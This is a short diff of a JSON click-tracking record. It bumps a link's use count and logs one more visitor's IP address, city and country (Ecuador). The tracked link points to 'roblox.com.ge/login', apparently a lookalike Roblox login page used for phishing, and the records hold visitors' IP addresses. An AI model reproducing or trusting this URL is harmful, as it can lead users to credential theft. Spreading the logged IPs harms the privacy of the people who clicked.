@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1365,
+    "useCount": 1366,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11086,6 +11086,14 @@
         "ip": "157.100.202.31",
         "country": "Ecuador",
         "city": "Quito",
+        "flag": "🇪🇨",
+        "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777419894757,
+        "ip": "201.218.56.198",
+        "country": "Ecuador",
+        "city": "Cuenca",
         "flag": "🇪🇨",
         "countryCode": "EC"
       }
